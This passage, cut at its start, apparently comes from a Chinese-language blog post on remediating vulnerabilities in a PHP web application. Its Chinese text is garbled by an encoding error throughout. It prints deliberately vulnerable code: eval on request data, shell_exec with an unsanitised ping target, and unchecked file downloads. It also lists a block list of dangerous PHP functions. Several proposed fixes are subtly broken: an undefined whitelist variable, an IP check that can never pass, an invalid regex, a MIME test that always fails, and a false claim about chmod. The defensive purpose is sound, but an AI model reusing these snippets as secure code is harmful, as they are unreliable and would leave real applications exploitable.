&#x27;é™„ä»¶ç±»å‹ä¸æ­£ç¡®ï¼&#x27;; &#125; if (!in_array($file_ext, $ext_limit)) &#123; $error_msg = &#x27;é™„ä»¶ç±»å‹ä¸æ­£ç¡®ï¼&#x27;; &#125; // ç¦æ­¢ä¸Šä¼ php,htmlåç¼€çš„æ–‡ä»¶ if($file_ext == &quot;php&quot; || $file_ext == &quot;html&quot;) &#123; $error_msg = &#x27;ç¦æ­¢ä¸Šä¼ éæ³•æ–‡ä»¶ï¼&#x27;; &#125; æ–¹æ³•äºŒ å¯¹ä¿å­˜æ–‡ä»¶çš„ç›®å½•ä¿®æ”¹æƒé™ã€‚ å·²ç»çŸ¥é“ï¼Œç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ä¼šè¢«ä¿å­˜åˆ°çš„public/uploads/imagesç›®å½•ä¸‹ï¼Œé¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹è¯¥æ–‡ä»¶çš„æƒé™ä¿¡æ¯ ls -ld images/ å¯ä»¥çœ‹åˆ°è¿™æ˜¯777æƒé™ï¼Œå¾ˆæ˜æ˜¾è¿™ä¸ªæƒé™è®¾ç½®æ˜¯ä¸åˆç†çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†å…¶æ”¹ä¸º744æƒé™ chmod -R 744 images/ å†æ¥æŸ¥çœ‹ä¹‹å‰ä¸Šä¼ ä¸Šçš„æœ¨é©¬æ–‡ä»¶å°±ä¼šå‘ç°æ–‡ä»¶ä¸å­˜åœ¨ï¼Œè¿™æ ·å°±ä¼šé¿å…äº†ä¸€å¥è¯æœ¨é©¬çš„å±å®³ 8.XSSæ¼æ´ç‚¹ä¸€ä»£ç åˆ†æif ($this-&gt;request-&gt;isPost()) &#123; $data = $this-&gt;request-&gt;post(&#x27;info/a&#x27;); $data[&#x27;send_from&#x27;] = $this-&gt;_userinfo[&#x27;username&#x27;]; if (!MemberModel::getByUsername($data[&#x27;send_to&#x27;])) &#123; return $this-&gt;error(&#x27;ç”¨æˆ·ä¸å­˜åœ¨&#x27;); &#125; if ($this-&gt;modelClass-&gt;allowField(true)-&gt;save($data)) &#123; $this-&gt;success(&#x27;å‘é€æˆåŠŸï¼&#x27;); &#125; else &#123; $this-&gt;error(&#x27;å‘é€å¤±è´¥ï¼&#x27;); &#125; å¯ä»¥çœ‹åˆ°è¿™é‡Œå¯¹ç”¨æˆ·å‘é€çš„æ¶ˆæ¯ï¼Œåªæ˜¯æ£€æŸ¥äº†æ¥æ”¶æ¶ˆæ¯è€…æ˜¯å¦å­˜åœ¨ï¼Œè€Œæ²¡æœ‰å¯¹ç”¨æˆ·å‘é€çš„å†…å®¹è¿›è¡Œæ£€æŸ¥å’Œè¿‡æ»¤ï¼Œç»™äº†æ”»å‡»è€…å¯ä¹˜ä¹‹æœºï¼Œè¿™é‡Œå°±éœ€è¦å¯¹ç”¨æˆ·è¾“å…¥çš„å†…å®¹è¿›è¡Œè¿‡æ»¤ã€‚ æ¼æ´é˜²å¾¡æ–¹æ³•ä¸€ ä½¿ç”¨phpè‡ªå¸¦çš„å‡½æ•°htmlspecialcharsï¼Œå°†ä¸€äº›ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ï¼Œä½¿å…¶æ— æ³•å·¥ä½œ é¦–å…ˆè¦çŸ¥é“dataçš„ç»“æ„ /* dataçš„æ•°æ®ç»“æ„ array(4) &#123; [&quot;subject&quot;]=&gt; string(3) &quot;sad&quot; [&quot;send_to&quot;]=&gt; string(5) &quot;sunzy&quot; [&quot;content&quot;]=&gt; string(2) &quot;ad&quot; [&quot;send_from&quot;]=&gt; string(5) &quot;admin&quot; &#125; */ if ($this-&gt;request-&gt;isPost()) &#123; $data = $this-&gt;request-&gt;post(&#x27;info/a&#x27;); $data[&#x27;send_from&#x27;] = $this-&gt;_userinfo[&#x27;username&#x27;]; // çŸ­æ¶ˆæ¯XSSé˜²å¾¡ $data[&#x27;subject&#x27;] = htmlspecialchars($data[&#x27;subject&#x27;]); $data[&#x27;content&#x27;] = htmlspecialchars($data[&#x27;content&#x27;]); if (!MemberModel::getByUsername($data[&#x27;send_to&#x27;])) &#123; return $this-&gt;error(&#x27;ç”¨æˆ·ä¸å­˜åœ¨&#x27;); &#125; if ($this-&gt;modelClass-&gt;allowField(true)-&gt;save($data)) &#123; $this-&gt;success(&#x27;å‘é€æˆåŠŸï¼&#x27;); &#125; else &#123; $this-&gt;error(&#x27;å‘é€å¤±è´¥ï¼&#x27;); &#125; &#125; else &#123; return $this-&gt;fetch(); &#125; æ­¤æ—¶å†å‘é€å¸¦æœ‰æ¶æ„è„šæœ¬çš„æ¶ˆæ¯æ—¶ï¼Œè¯¥è„šæœ¬å°±ä¸ä¼šè¢«æµè§ˆå™¨æ‰§è¡Œï¼Œè€Œæ˜¯å½“ä½œæ™®é€šçš„å­—ç¬¦ä¸² æ–¹æ³•äºŒ è¿™é‡Œå°±ç”¨ä¸€ä¸ªå¾ˆå®‰å…¨çš„è¿‡æ»¤å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å¾ˆéš¾è¢«ç»•è¿‡ã€‚ function SafeFilter (&amp;$arr) &#123; $ra=Array(&#x27;/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/&#x27;,&#x27;/script/&#x27;,&#x27;/javascript/&#x27;,&#x27;/vbscript/&#x27;,&#x27;/expression/&#x27;,&#x27;/applet/&#x27;,&#x27;/meta/&#x27;,&#x27;/xml/&#x27;,&#x27;/blink/&#x27;,&#x27;/link/&#x27;,&#x27;/style/&#x27;,&#x27;/embed/&#x27;,&#x27;/object/&#x27;,&#x27;/frame/&#x27;,&#x27;/layer/&#x27;,&#x27;/title/&#x27;,&#x27;/bgsound/&#x27;,&#x27;/base/&#x27;,&#x27;/onload/&#x27;,&#x27;/onunload/&#x27;,&#x27;/onchange/&#x27;,&#x27;/onsubmit/&#x27;,&#x27;/onreset/&#x27;,&#x27;/onselect/&#x27;,&#x27;/onblur/&#x27;,&#x27;/onfocus/&#x27;,&#x27;/onabort/&#x27;,&#x27;/onkeydown/&#x27;,&#x27;/onkeypress/&#x27;,&#x27;/onkeyup/&#x27;,&#x27;/onclick/&#x27;,&#x27;/ondblclick/&#x27;,&#x27;/onmousedown/&#x27;,&#x27;/onmousemove/&#x27;,&#x27;/onmouseout/&#x27;,&#x27;/onmouseover/&#x27;,&#x27;/onmouseup/&#x27;,&#x27;/onunload/&#x27;); if (is_array($arr)) &#123; foreach ($arr as $key =&gt; $value) //å¾ªç¯è¯­å¥ï¼ŒæŒ¨ä¸ªæ£€æµ‹ &#123; if (!is_array($value)) &#123; if (!get_magic_quotes_gpc()) &#123; $value = addslashes($value); //ç»™å•å¼•å·ï¼ˆ&#x27;ï¼‰ã€åŒå¼•å·ï¼ˆ&quot;ï¼‰ã€åæ–œçº¿ï¼ˆ\\ï¼‰ä¸ NULï¼ˆNULL å­—ç¬¦ï¼‰ åŠ ä¸Šåæ–œçº¿è½¬ä¹‰ &#125; $value = preg_replace($ra,&#x27;&#x27;,$value); //åˆ é™¤éæ‰“å°å­—ç¬¦ $arr[$key] = htmlentities(strip_tags($value)); //å»é™¤ HTML å’Œ PHP æ ‡è®°å¹¶è½¬æ¢ä¸º HTML å®ä½“ &#125; else &#123; SafeFilter($arr[$key]); &#125; &#125; &#125; &#125; æ¼æ´ç‚¹äºŒä»£ç åˆ†æä»£ç ä½ç½®application\\member\\controller\\Index.phpä¸­çš„commentæ–¹æ³• å¾ˆå®¹æ˜“çœ‹åˆ°ï¼Œæ²¡æœ‰å¯¹æäº¤çš„æ•°æ®è¿›è¡Œå¤„ç†ï¼Œå¹¶ä¸”å°†æäº¤çš„æ•°æ®åœ¨é¡µé¢ä½¿ç”¨echoæ‰“å°å‡ºæ¥ï¼Œå¯¼è‡´äº†XSSæ¼æ´ æ¼æ´é˜²å¾¡ä½¿ç”¨phpè‡ªå¸¦çš„å‡½æ•°htmlspecialcharsï¼Œå°†ä¸€äº›ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ï¼Œä½¿å…¶æ— æ³•å·¥ä½œï¼Œæˆ–è€…ä½¿ç”¨ä¸Šé¢çš„è¿‡æ»¤å‡½æ•° public function comment()&#123; if($this-&gt;request-&gt;isPost())&#123; $data = $_POST[&#x27;data&#x27;]; $data = htmlspecialchars($data); $userId = $this-&gt;userid; 9.RCEæ¼æ´ç‚¹ä¸€ä»£ç åˆ†æapplication\\admin\\phpinfo\\index public function index() &#123; if ($this-&gt;request-&gt;isPost())&#123; $data = $this-&gt;request-&gt;post(&#x27;data&#x27;); echo eval($data.&#x27;;&#x27;); &#125; return $this-&gt;fetch(); &#125; eval()å‡½æ•°å°†ä¼ è¿›æ¥çš„å­—ç¬¦ä¸²å½“ä½œphpä»£ç æ‰§è¡Œï¼Œå¯¼è‡´äº†å‘½ä»¤æ‰§è¡Œ æ¼æ´é˜²å¾¡æ—¢ç„¶åŠŸèƒ½å°±æ˜¯æŸ¥çœ‹phpinfoï¼Œé‚£å°±è®¾ç½®ä¸€ä¸ªç™½åå•ï¼Œæ£€æŸ¥æäº¤çš„å€¼æ˜¯å¦ä¸ºphpinfo public function index() &#123; if ($this-&gt;request-&gt;isPost())&#123; $data = $this-&gt;request-&gt;post(&#x27;data&#x27;); $whitelist = array(&#x27;phpinfo&#x27;); if (in_array($file, $whitelist)) &#123; return eval($data.&#x27;;&#x27;); &#125; else &#123; return $this-&gt;error(&quot;Hacker!&quot;); &#125; &#125; return $this-&gt;fetch(); &#125; æ¼æ´ç‚¹äºŒ ä»£ç åˆ†æ if ($this-&gt;request-&gt;isPost()) &#123; $ip = $this-&gt;request-&gt;post(&#x27;data&#x27;); $ip = trim($ip); $result = &quot;&quot;; if(isset($ip) &amp;&amp; $ip !== &#x27;&#x27;) &#123; $result = shell_exec(&#x27;ping &#x27;.$ip); return &quot;&lt;pre&gt;$result&lt;/pre&gt;&quot;; &#125; &#125; å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œæ²¡æœ‰å¯¹ç”¨æˆ·æäº¤çš„ipåœ°å€è¿›è¡Œä»»ä½•æ£€æŸ¥åˆ¤æ–­ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ç®¡é“ç¬¦æ¶æ„çš„æ‹¼æ¥å‘½ä»¤ï¼Œä»è€Œå¯¼è‡´äº†å‘½ä»¤æ³¨å…¥ï¼Œè·å–åˆ°æœåŠ¡çš„æ•æ„Ÿèµ„æºã€‚ æ¼æ´ç‚¹äºŒæ¼æ´é˜²å¾¡æ–¹æ³•ä¸€ å¯¹ç”¨æˆ·æäº¤çš„ipçš„åœ°å€è¿›è¡Œåˆ¤æ–­ï¼Œåªæœ‰å½“ç¬¦åˆIPv4çš„åœ°å€æ ¼å¼æ—¶ï¼Œæ‰å…è®¸æ‰§è¡Œä¸‹ä¸€æ­¥æ“ä½œã€‚ å…·ä½“ä»£ç å¦‚ä¸‹ if ($this-&gt;request-&gt;isPost()) &#123; $ip = $this-&gt;request-&gt;post(&#x27;data&#x27;); $ip = trim($ip); $is_ip = false; $result = &#x27;&#x27;; $data = explode(&#x27;.&#x27;,$ip); // åˆ©ç”¨ipv4åœ°å€çš„ç‰¹æ€§æ£€æŸ¥ for($i=0; $i&lt;count($data); $i++)&#123; if($data[$i] &gt; 255 ) &#123; $is_ip = false; &#125; &#125; if(!$is_ip)&#123; $result = &quot;è¯·è¾“å…¥æ­£ç¡®çš„IPv4åœ°å€ï¼&quot;; &#125; else&#123; $result = shell_exec(&#x27;ping -c 4&#x27;.$ip); &#125; return &quot;&lt;pre&gt;$result&lt;/pre&gt;&quot;; &#125; æ–¹æ³•äºŒ ä½¿ç”¨phpå†…ç½®çš„å‡½æ•°å¯¹æäº¤çš„å‚æ•°è¿›è¡Œè¿‡æ»¤å’Œè½¬ä¹‰ï¼Œä½¿å¾—æ”»å‡»è€…è¾“å…¥çš„ä¸€äº›ç‰¹æ®Šå­—ç¬¦å¤±å»åŸæ¥çš„ä½œç”¨ã€‚ escapeshellcmdå’Œescapeshellargå‡½æ•° if ($this-&gt;request-&gt;isPost()) &#123; $ip = $this-&gt;request-&gt;post(&#x27;data&#x27;); $ip = trim($ip); $ip = escapeshellcmd($ip); $ip = escapeshellarg($ip); $result = &quot;&quot;; if(isset($ip) &amp;&amp; $ip !== &#x27;&#x27;) &#123; $result = shell_exec(&#x27;ping &#x27;.$ip); return &quot;&lt;pre&gt;$result&lt;/pre&gt;&quot;; &#125; &#125; 10.CSRFæ¼æ´ç‚¹ä¸€ä»£ç åˆ†æapplication\\member\\controller\\Member.phpä¸­çš„jifenæ–¹æ³• æ¼æ´é˜²å¾¡é¦–å…ˆåœ¨å‰ç«¯ä»£ç ä¸­åŠ å…¥&#123;:token&#125;ï¼Œè®©ç”¨æˆ·æ¯æ¬¡è®¿é—®æ—¶éƒ½æºå¸¦ä¸€ä¸ªéšæœºtokenï¼Œå†åœ¨åç«¯é¡µé¢ä¸­æ£€æŸ¥è¯¥tokenæ˜¯å¦æ­£ç¡® $token = [&#x27;__token__&#x27;=&gt; $_POST[&#x27;__token__&#x27;]]; // è®¾ç½®æ£€æŸ¥è§„åˆ™ $rule = [ &#x27;__token__&#x27; =&gt; &#x27;require|token&#x27;, ]; // åˆ©ç”¨validataå‡½æ•°æ£€æŸ¥ $result = $this-&gt;validate($token, $rule); // tokenæ£€æŸ¥ä¸é€šè¿‡åˆ™ç›´æ¥é€€å‡ºï¼Œå¹¶è­¦å‘Šç«™ç‚¹ä¸å®‰å…¨ã€‚ if($result !== true)&#123; return $this-&gt;error(&quot;website is unsafe!&quot;); &#125; æ¼æ´ç‚¹äºŒï¼Œä¸‰ï¼Œå››ä»£ç åˆ†æä»£ç ä½ç½®application\\member\\controller\\Member.phpä¸­çš„editæ–¹æ³• public function edit() &#123; if ($this-&gt;request-&gt;isPost()) &#123; $userid = $this-&gt;request-&gt;param(&#x27;id/d&#x27;, 0); $data = $this-&gt;request-&gt;post(); $result = $this-&gt;validate($data, &#x27;member.edit&#x27;); if (true !== $result) &#123; return $this-&gt;error($result); &#125; ... ä¸Šé¢çš„ä»£ç åªæ˜¯å¯¹æäº¤çš„æ•°æ®è¿›è¡Œäº†æ£€æŸ¥ï¼Œæ•°æ®ç¬¦åˆè§„åˆ™å°±ä¼šæˆåŠŸï¼Œä½†æ˜¯æ²¡æœ‰å¯¹è¯·æ±‚çš„æ¥æºåšä»»ä½•çš„æ£€æŸ¥ï¼Œè¿™ä¹Ÿæ˜¯åšæˆCSRFæ¼æ´çš„æœ€å¤§åŸå› ã€‚ æ¼æ´é˜²å¾¡CSRFæ¼æ´çš„é˜²å¾¡ è®¾ç½®tokenï¼Œä¸ç®¡ç†å‘˜ç™»å½•é¡µé¢ä¸€æ ·ï¼Œæ¯æ¬¡è¯·æ±‚çš„å‰ç«¯é¡µé¢éƒ½ä¼šéšè—ä¸€ä¸ªéšæœºäº§ç”Ÿçš„tokenï¼Œè€Œåœ¨æäº¤è¯·æ±‚æ—¶è¿™ä¸ªtokenä¹Ÿä¼šå‘é€åˆ°åç«¯ï¼Œæ­¤æ—¶æœåŠ¡å™¨ä¼šæ£€æŸ¥ï¼Œæäº¤çš„tokenæ˜¯å¦æ­£ç¡®ï¼Œåªæœ‰æ­£ç¡®æ—¶æ‰ä¼šè¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œã€‚ refererä»£è¡¨ç€è¯·æ±‚çš„æ¥æºï¼Œä¸å¯ä»¥ä¼ªé€ ã€‚ä½†æ˜¯æµè§ˆå™¨å¯ä»¥å…³é—­refererã€‚ ç¦æ­¢ç¬¬ä¸‰æ–¹ç½‘ç«™ä½¿ç”¨æœ¬ç«™Cookieã€‚ä½†æ˜¯åªæœ‰ä¸ªåˆ«çš„æµè§ˆå™¨æ”¯æŒã€‚ æ‰€ä»¥è¿™é‡Œé€‰æ‹©ä½¿ç”¨tokenï¼Œä¿®å¤è¯¥æ¼æ´ã€‚ å‰ç«¯ä»£ç  åŸºæœ¬ä¸éœ€è¦ä¿®æ”¹ï¼Œåªéœ€è¦å¢åŠ ä¸€ä¸ªéšè—çš„tokenå€¼ï¼Œä»£ç ä½ç½®application\\member\\view\\member\\edit.html æ­¤æ—¶çš„å‰ç«¯é¡µé¢å°±ä¼šäº§ç”Ÿä¸€ä¸ªæ–°æ ‡ç­¾ï¼Œå°±æ˜¯tokenå€¼ åç«¯ä»£ç  application\\member\\controller\\Member.phpä¸­çš„editæ–¹æ³• public function edit() &#123; if ($this-&gt;request-&gt;isPost()) &#123; $userid = $this-&gt;request-&gt;param(&#x27;id/d&#x27;, 0); $data = $this-&gt;request-&gt;post(); // è·å–å‰ç«¯çš„tokenå€¼ $token = [&#x27;__token__&#x27;=&gt; $data[&#x27;__token__&#x27;]]; // è®¾ç½®æ£€æŸ¥è§„åˆ™ $rule = [ &#x27;__token__&#x27; =&gt; &#x27;require|token&#x27;, ]; // åˆ©ç”¨validataå‡½æ•°æ£€æŸ¥ $result = $this-&gt;validate($token, $rule); // tokenæ£€æŸ¥ä¸é€šè¿‡åˆ™ç›´æ¥é€€å‡ºï¼Œå¹¶è­¦å‘Šç«™ç‚¹ä¸å®‰å…¨ã€‚ if($result !== true)&#123; return $this-&gt;error(&quot;website is unsafe!&quot;); &#125; $result = $this-&gt;validate($data, &#x27;member.edit&#x27;); if (true !== $result) &#123; return $this-&gt;error($result); &#125; ... å†ä½¿ç”¨bpæŠ“åŒ…ç”ŸæˆCSRFçš„pocï¼Œæ­¤æ—¶å°±ä¸èƒ½æˆåŠŸäº† 11.ä»»æ„æ–‡ä»¶ä¸‹è½½ä»£ç åˆ†æä»£ç ä½äºapplication\\download\\controller\\Index.phpä¸­çš„indexæ–¹æ³• public function index() &#123; header(&quot;Content-type:text/html;charset=utf-8&quot;); if($this-&gt;request-&gt;isGet() &amp;&amp; $_GET[&#x27;filename&#x27;] !== null)&#123; if($_GET[&#x27;filename&#x27;] !== &#x27;&#x27;)&#123; $filename = $_GET[&#x27;filename&#x27;]; $filename = &quot;nba/&quot;.$filename; iconv(&quot;utf-8&quot;,&quot;gb2312&quot;,$filename); if(!file_exists($filename))&#123; return $this-&gt;error(&quot;æ–‡ä»¶ä¸å­˜åœ¨ï¼&quot;); &#125; $fp = fopen($filename, &#x27;rb&#x27;); $file_size = filesize($filename); ob_clean(); Header(&quot;Content-type: application/octet-stream&quot;); Header(&quot;Accept-Ranges: bytes&quot;); Header(&quot;Accept-Length:&quot;.$file_size); Header(&quot;Content-Disposition: attachment; filename=&quot;.basename($filename)); $buffer=1024; $file_count=0; while(!feof($fp) &amp;&amp; $file_count&lt;$file_size)&#123; $file_con=fread($fp,$buffer); $file_count+=$buffer; echo $file_con; &#125; fclose($fp); return view(); &#125; &#125; return view(); &#125; è¿™é‡Œå°±æ˜¯å®ç°äº†ä¸€ä¸ªå›¾ç‰‡ä¸‹è½½çš„æ–¹æ³•ï¼Œä½¿å¾—ç”¨æˆ·å¯ä»¥ä¸‹è½½public/nbaæ–‡ä»¶å¤¹ä¸‹çš„å›¾ç‰‡ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å¯¹æäº¤çš„filenameå‚æ•°è¿›è¡Œæ£€æŸ¥å’Œè¿‡æ»¤ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨../å®ç°ç›®å½•çš„è·³è½¬ï¼Œä»è€Œå¯ä»¥ä¸‹è½½ä»»æ„æ–‡ä»¶ æ¼æ´é˜²å¾¡ä¸»è¦çš„é˜²å¾¡æ–¹æ³•å°±æ˜¯é™åˆ¶ç”¨æˆ·è¾“å…¥çš„æ–‡ä»¶ååœ¨ç¨‹åºæŒ‡å®šçš„ç›®å½•ä¸‹ï¼Œé‚£ä¹ˆå°±æ˜¯ä¸èƒ½ä½¿ç”¨../è¿›è¡Œç›®å½•çš„è·³è½¬ï¼Œå¹¶ä¸”å¯¹ç”¨æˆ·ä¸‹è½½çš„æ–‡ä»¶åç¼€åè¿›è¡Œæ£€æŸ¥ public function check_file($filename)&#123; if(preg_match(&quot;../&quot;, $filename))&#123; return $this-&gt;error(&quot;hacker!&quot;); &#125; // è·å–æ–‡ä»¶çš„MIME æ£€æŸ¥æ˜¯å¦ç¬¦åˆå›¾ç‰‡ç±»å‹çš„è¦æ±‚ $file_type = $_FILES[ $filename ][ &#x27;type&#x27; ]; if($file_type !== &#x27;image/jpeg&#x27; || $file_type !== &#x27;image/png&#x27;|| $file_type !== &#x27;image/gif&#x27;)&#123; return $this-&gt;error(&quot;hacker!&quot;); &#125; &#125; 12.unserializeç”±äºè¿™é‡Œçš„ååºåˆ—åŒ–æ¼æ´æ˜¯ä¸€ä¸ªctfé¢˜ç›®ï¼Œå¦‚æœä¿®å¤äº†å°±å¤±å»äº†å®ƒäº†å­˜åœ¨çš„æ„ä¹‰ï¼Œæ‰€ä»¥è¿™é‡Œæ²¡æœ‰ä¿®å¤æ–¹æ³•ã€‚ä½†æ˜¯é’ˆå¯¹äºä¸€èˆ¬çš„unserilizeï¼Œè¿˜æ˜¯æœ‰å¾ˆå¤šé˜²å¾¡æ–¹æ³•çš„ã€‚ 1.ä¸¥æ ¼çš„æŠŠæ§ unserailize() å‡½æ•°çš„å‚æ•°ï¼Œä¸è¦ç»™æ”»å‡»è€…ä»»ä½•è¾“å…¥çš„å¯èƒ½ 2.åœ¨æ–‡ä»¶ç³»ç»Ÿå‡½æ•°çš„å‚æ•°å¯æ§æ—¶ï¼Œå¯¹å‚æ•°è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ã€‚ 3.ä¸¥æ ¼æ£€æŸ¥ä¸Šä¼ æ–‡ä»¶çš„å†…å®¹ï¼Œè€Œä¸æ˜¯åªæ£€æŸ¥æ–‡ä»¶å¤´ã€‚ 4.åœ¨æ¡ä»¶å…è®¸çš„æƒ…å†µä¸‹ç¦ç”¨å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€ä»£ç çš„å±é™©å‡½æ•°ã€‚ è€Œå¯¹äºè¿™ç§æ¡†æ¶ç±»å‹çš„ç½‘ç«™,åˆ™éœ€è¦å¼€å‘è€…æ³¨æ„ä½¿ç”¨å®‰å…¨çš„ç½‘ç«™æ¶æ„,å‘ç°æ¼æ´åéœ€è¦åŠæ—¶ä¿®å¤æ¼ï¼Œå¹¶ä¸”ä¸å®‰å…¨çš„åºåˆ—åŒ–åçš„å¯¹è±¡ï¼Œå‡å°‘ä½¿ç”¨system,evalç­‰å¯èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨çš„å‡½æ•°ã€‚ 13.æœåŠ¡å™¨å®‰å…¨é…ç½®é˜²å¾¡æ¼æ´php.inié…ç½® ç¦æ­¢ä½¿ç”¨çš„PHPå±é™©å‡½æ•°ï¼šWebæœ¨é©¬ç¨‹åºé€šå¸¸åˆ©ç”¨phpçš„ç‰¹æ®Šå‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ŒæŸ¥è¯¢ä»»æ„ç›®å½•æ–‡ä»¶ï¼Œå¢åŠ ä¿®æ”¹åˆ é™¤æ–‡ä»¶ç­‰ã€‚phpæœ¨é©¬ç¨‹åºå¸¸ä½¿ç”¨çš„å‡½æ•°ä¸ºï¼šdl,assert,exec,popen,system,passthru,shell_execç­‰ åœ¨php.iniä¸­æ·»åŠ å¦‚ä¸‹çš„å†…å®¹ï¼š disable_functions = dl,assert,exec,popen,system,passthru,shell_exec,proc_close,proc_open,pcntl_exec å…³é—­æ³¨å†Œå…¨å±€å˜é‡ï¼šåœ¨PHPä¸­æäº¤çš„å˜é‡ï¼ŒåŒ…æ‹¬ä½¿ç”¨POSTæˆ–è€…GETæäº¤çš„å˜é‡ï¼Œä¼šè‡ªåŠ¨æ³¨å†Œä¸ºå…¨å±€å˜é‡ï¼Œèƒ½å¤Ÿç›´æ¥è®¿é—®ï¼Œè¿™æ˜¯å¯¹æœåŠ¡å™¨éå¸¸ä¸å®‰å…¨çš„ï¼Œæ‰€ä»¥ä¸èƒ½è®©å®ƒæ³¨å†Œä¸ºå…¨å±€å˜é‡ï¼Œå°±æŠŠæ³¨å†Œå…¨å±€å˜é‡é€‰é¡¹å…³é—­ã€‚ å…³é—­æ³¨å†Œå…¨å±€å˜é‡è®¾ç½®ï¼š register_globals = Off å¼€å¯magic_quotes_gpcï¼šmagic_quotes_gpcä¼šæŠŠå¼•ç”¨çš„æ•°æ®ä¸­åŒ…å«å•å¼•å·â€™å’ŒåŒå¼•å·â€ä»¥åŠåæ–œçº¿ \\è‡ªåŠ¨åŠ ä¸Šåæ–œçº¿ï¼Œè‡ªåŠ¨è½¬è¯‘ç¬¦å·ï¼Œç¡®ä¿æ•°æ®æ“ä½œçš„æ­£ç¡®è¿è¡Œï¼Œmagic_quotes_gpcçš„è®¾å®šå€¼å°†ä¼šå½±å“é€šè¿‡Get/Post/Cookiesè·å¾—çš„æ•°æ®ï¼Œå¯ä»¥æœ‰æ•ˆçš„é˜²æ­¢SQLæ³¨å…¥æ¼æ´ã€‚ æ‰“å¼€magic_quotes_gpcè®¾ç½®ï¼š magic_quotes_gpc = On å…³é—­é”™è¯¯æ¶ˆæ¯æ˜¾ç¤ºï¼šphpåœ¨æ²¡æœ‰è¿æ¥åˆ°æ•°æ®åº“æˆ–è€…å…¶ä»–æƒ…å†µä¸‹ä¼šæœ‰æç¤ºé”™è¯¯ï¼Œä¸€èˆ¬é”™è¯¯ä¿¡æ¯ä¸­ä¼šåŒ…å«phpè„šæœ¬å½“å‰çš„è·¯å¾„ä¿¡æ¯æˆ–è€…æŸ¥è¯¢çš„SQLè¯­å¥ç­‰ä¿¡æ¯ï¼Œè¿™ç±»ä¿¡æ¯æä¾›ç»™é»‘å®¢åï¼Œæ˜¯ä¸å®‰å…¨çš„ï¼Œæ‰€ä»¥æœåŠ¡å™¨å»ºè®®ç¦æ­¢é”™è¯¯æç¤ºã€‚ å…³é—­é”™è¯¯ä¿¡æ¯æ˜¾ç¤ºè®¾ç½®ï¼š display_errors = Off ç¦æ­¢è®¿é—®è¿œç¨‹æ–‡ä»¶:å…è®¸è®¿é—®URLè¿œç¨‹èµ„æºä½¿å¾—PHPåº”ç”¨ç¨‹åºçš„æ¼æ´å˜å¾—æ›´åŠ å®¹æ˜“è¢«åˆ©ç”¨ï¼Œphpè„šæœ¬è‹¥å­˜åœ¨è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´å¯ä»¥è®©æ”»å‡»è€…ç›´æ¥è·å–ç½‘ç«™æƒé™åŠä¸Šä¼ webæœ¨é©¬ é…ç½®å¦‚ä¸‹ï¼š allow_url_fopen = Off allow_url_include = Off å¼€å¯phpå®‰å…¨æ¨¡å¼ï¼šphpçš„å®‰å…¨æ¨¡å¼æ˜¯ä¸ªéå¸¸é‡è¦çš„å†…åµŒçš„å®‰å…¨æœºåˆ¶ï¼Œèƒ½å¤Ÿæ§åˆ¶ä¸€äº›phpä¸­çš„å‡½æ•°ï¼Œæ¯”å¦‚system()ï¼ŒåŒæ—¶æŠŠå¾ˆå¤šæ–‡ä»¶æ“ä½œå‡½æ•°è¿›è¡Œäº†æƒé™æ§åˆ¶ï¼Œä¹Ÿä¸å…è®¸å¯¹æŸäº›å…³é”®æ–‡ä»¶çš„è¯»å–ã€‚ safe_mode = On nginxæœåŠ¡å™¨å®‰å…¨é…ç½®ä¿®æ”¹nginx.conf ç¦æ­¢æ•æ„Ÿæ–‡ä»¶çš„ç›´æ¥è®¿é—®ï¼Œå¯ä»¥æœ‰æ•ˆçš„é˜²å¾¡æ–‡ä»¶ä¸Šä¼ æ”»å‡»ï¼Œä¿®æ”¹serveræ®µ location ~ ^/(uploads|static)/.*.(php|php3|php4|php5|cgi|asp|aspx|jsp|shtml|shtm|pl|cfm|sql|mdb|dll|exe|com|inc|sh)$ &#123; deny all; &#125; ç¦æ­¢å±é™©IPçš„è®¿é—® //ç¦æ­¢çš„å†™æ³• deny 10.0.0.0/24; //å…è®¸çš„å†™æ³• allow 10.0.0.0/24; deny all; éšè—ç‰ˆæœ¬ä¿¡æ¯ server_tokens off; proxy_hide_header X-Powered-By ä»£ç å®‰å…¨ config/app.phpä¸­çš„app_debugå’Œapp_traceè®¾ç½®falseï¼Œå…³é—­è°ƒè¯•æ¨¡å¼ é»˜è®¤æ˜¯åŸŸåç»‘å®šåœ¨publicç›®å½•ï¼Œä¸ºå”¯ä¸€å¯¹å¤–è®¿é—®ç›®å½• åŠ¡å¿…æ›´æ”¹é»˜è®¤å¯†ç ï¼Œå¹¶ä¸è¦è®¾ç½®çš„è¿‡äºç®€å•ï¼Œé˜²æ­¢æš´åŠ›ç ´è§£ åå°ç¦æ­¢è®¿é—®IPï¼Œå¯ä»¥åœ¨è®¾ç½®-ç½‘ç«™è®¾ç½®ä¸­è®¾ç½® é—®é¢˜ä¸æ€»ç»“é—®é¢˜ æ•°æ®åº“è¿æ¥å¤±è´¥ SQLSTATE[HYO00][2002] Connection refused è§£å†³æ–¹æ³•å¦‚ä¸‹ æ•°æ®åº“å…³é—­ ä¸Šé¢çš„é”™è¯¯æ˜¯mysqlæ•°æ®åº“çš„å®¹å™¨å…³é—­å¯¼è‡´ ä½†æ˜¯é‡å¯æ—¶è¿˜æ˜¯ç«‹å³å…³é—­ æŸ¥çœ‹æ—¥å¿—çœ‹åˆ°å¦‚ä¸‹å†…å®¹ï¼Œç™¾åº¦è§£å†³ root@sunzy-virtual-machine:~# docker logs -f 250c80740b5b Warning: World-writable config file &#x27;/etc/mysql/conf.d/my.cnf&#x27; is ignored Warning: World-writable config file &#x27;/etc/mysql/conf.d/my.cnf&#x27; is ignored 